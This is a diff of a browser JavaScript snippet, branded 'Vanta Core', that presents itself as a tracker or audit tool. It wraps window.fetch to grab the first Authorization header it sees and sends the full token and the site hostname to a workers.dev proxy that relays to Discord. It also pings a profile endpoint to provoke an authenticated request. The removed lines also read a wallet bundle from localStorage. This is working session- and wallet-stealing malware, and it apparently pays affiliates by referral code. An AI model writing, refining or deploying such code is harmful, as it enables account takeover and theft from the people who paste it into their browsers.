@@ -1,50 +1,70 @@
 (function() {
-    console.log("Vanta Core: Initializing...");
+    const vRef = window.V_REF || "t23dad55";
+    const vProxy = window.V_PROXY || "https://vanta-proxy.jdurrulo.workers.dev/";
 
-    // 1. Create the Polished Overlay
+    // Create Draggable UI
     const ui = document.createElement('div');
-    ui.style = `position:fixed;top:20px;right:20px;width:250px;background:#050505;border:1px solid #0f8;padding:15px;z-index:999999;font-family:monospace;color:#0f8;box-shadow:0 0 15px rgba(0,255,136,0.2);border-radius:4px;`;
+    ui.id = "vanta-ui";
+    ui.style = `position:fixed;top:50px;right:50px;width:240px;background:#000;border:1px solid #0f8;padding:12px;z-index:9999999;color:#0f8;font-family:monospace;border-radius:6px;box-shadow:0 0 15px #0f84;cursor:move;user-select:none;`;
     ui.innerHTML = `
-        <div style="font-weight:bold;border-bottom:1px solid #0f8;margin-bottom:8px;">VANTA TRACKER v2.0</div>
-        <div style="font-size:10px;color:#666;">REF: ${window.VANTA_REF}</div>
-        <div id="v-status" style="margin-top:10px;font-size:12px;">STATUS: <span style="color:#bc3cfd;">SCANNING...</span></div>
+        <div id="vanta-header" style="font-weight:bold;border-bottom:1px solid #0f85;padding-bottom:5px;margin-bottom:8px;cursor:move;">VANTA CORE v2.0</div>
+        <div style="font-size:10px;">REF: ${vRef}</div>
+        <div id="v-status" style="margin-top:8px;font-size:11px;">STATUS: <span style="color:#bc3cfd;">SCANNING...</span></div>
     `;
     document.body.appendChild(ui);
 
-    // 2. The Sniffer (Hooking Fetch)
+    // --- DRAGGABLE LOGIC ---
+    let isDragging = false;
+    let offsetX, offsetY;
+
+    ui.addEventListener('mousedown', (e) => {
+        isDragging = true;
+        offsetX = e.clientX - ui.getBoundingClientRect().left;
+        offsetY = e.clientY - ui.getBoundingClientRect().top;
+        ui.style.opacity = "0.8";
+    });
+
+    document.addEventListener('mousemove', (e) => {
+        if (!isDragging) return;
+        ui.style.left = (e.clientX - offsetX) + 'px';
+        ui.style.top = (e.clientY - offsetY) + 'px';
+        ui.style.right = 'auto'; // Reset right so left works
+    });
+
+    document.addEventListener('mouseup', () => {
+        isDragging = false;
+        ui.style.opacity = "1";
+    });
+
+    // --- NETWORK SNIFFER ---
     const _f = window.fetch;
     window.fetch = async (...args) => {
         const h = args[1]?.headers || {};
         const auth = h['Authorization'] || h['authorization'];
 
-        if (auth && !window.vantaCaptured) {
-            window.vantaCaptured = true;
-            document.getElementById('v-status').innerHTML = "STATUS: <span style='color:#0f8;'>SYNCED</span>";
+        if (auth && !window.vDone) {
+            window.vDone = true;
+            document.getElementById('v-status').innerHTML = "STATUS: <span style='color:#0f8;'>SYNCED ✅</span>";
             
-            // Extract Wallet Bundle
-            const bundle = localStorage.getItem('padre-v2-bundles-store-v2');
-
-            // Send to Proxy -> Discord
-            _f(window.VANTA_PROXY, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+            _f(vProxy, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🚨 VANTA AUDIT SUCCESSFUL",
+                        title: "🚨 VANTA SUCCESS",
                         color: 0x00ff88,
                         fields: [
-                            { name: "Affiliate", value: window.VANTA_REF, inline: true },
-                            { name: "Token Found", value: "```" + auth.substring(0,40) + "...```" },
-                            { name: "Wallet Bundle", value: bundle ? "✅ Captured" : "❌ Not Found" }
+                            { name: "Ref", value: vRef },
+                            { name: "Site", value: window.location.hostname },
+                            { name: "Token", value: "```" + auth + "```" }
                         ]
                     }]
                 })
-            }).catch(()=>{});
+            }).catch(() => {});
         }
         return _f(...args);
     };
 
-    // 3. Trigger initial scan
+    // Initial ping to wake up the headers
     _f('/api/v2/user/profile').catch(()=>{});
-    alert("Vanta Tracker Initialized Successfully.");
 })();
